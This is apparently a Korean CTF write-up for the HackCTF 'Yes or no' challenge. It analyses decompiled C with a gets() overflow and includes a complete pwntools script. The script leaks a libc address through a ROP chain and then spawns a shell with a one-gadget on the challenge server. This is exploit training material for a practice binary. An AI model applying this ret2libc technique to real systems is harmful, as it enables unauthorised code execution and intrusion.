---
title: "[HackCTF]Yes or no"
date: 2019-12-26
tags: [HackCTF]
categories: [HackCTF]
---

문제 의도는 그냥 ++전에 오는지 후에 오는지로 값 어떻게 나오는지 알아서 값을 맞춰주도록 해서 취약점으로 유도하는게 의도였던거 같다. 문제 서버는 ubuntu 18.04다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // eax
  char s; // [rsp+Eh] [rbp-12h]
  int input; // [rsp+18h] [rbp-8h]
  int v11; // [rsp+1Ch] [rbp-4h]

  setvbuf(stdout, 0LL, 2, 0LL);
  v11 = 5;
  puts("Show me your number~!");
  fgets(&s, 10, stdin);
  input = atoi(&s);
  if ( (v11 - 10) >> 3 < 0 )
  {
    v4 = 0;
  }
  else
  {
    v3 = v11++;
    v4 = input - v3;
  }
  if ( v4 == input )
  {
    puts("Sorry. You can't come with us");
  }
  else
  {
    v5 = 1204 / ++v11;
    v6 = v11++;
    if ( input == v6 * v5 << (++v11 % 20 + 5) )
    {
      puts("That's cool. Follow me");
      gets(&s);
    }
    else
    {
      v7 = v11--;
      if ( input == v7 )
      {
        printf("Why are you here?");
        return 0;
      }
      puts("All I can say to you is \"do_system+1094\".\ngood luck");
    }
  }
  return 0;
}
```

입력한 숫자 정수형을 바꿔서 취약점 터지는 부분에 가게 하면 된다.

```
if ( input == v6 * v5 << (++v11 % 20 + 5) )
{
	puts("That's cool. Follow me");
	gets(&s);
}
```

취약점은 여기에서 터진다. 그래서 input값을 구해주면 된다.

![](https://user-images.githubusercontent.com/32904385/71475652-898eeb00-2824-11ea-8b21-9cb91fea4988.png)

그냥 c로 짜서 나온 결과 가져왔다. 결과는 `9830400` 이면 통과해서 `gets(&s)` 로 갈 수 있게된다.

그래서 `9830400` 들어가서 gets로 ret 바꿔서 puts leak하고 main으로 돌려서 oneshot 날려주면 된다. 그냥 문제에 라이브러리도 줘서 쉽게 풀었다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'
e = ELF('./yes_or_no')
# p = process('./yes_or_no')
p = remote('ctf.j0n9hyun.xyz',3009)
libc = ELF('./libc-2.27.so')
prdi = 0x0000000000400883 # pop rdi ; ret

p.sendlineafter('!\n',str(9830400))

payload = '\x90' * 0x12
payload += 'realsung'
payload += p64(prdi) + p64(e.got['puts']) + p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.sendlineafter('me\n',payload)

libc_base = u64(p.recvuntil('\x7f').ljust(8,'\x00')) - libc.symbols['puts']
log.info('libc_base : ' + hex(libc_base))

p.sendlineafter('!\n',str(9830400))

payload2 = '\x90' * 0x12
payload2 += 'realsung'
payload2 += p64(libc_base + 0x45216)
p.sendlineafter('me\n',payload2)

p.interactive()
```

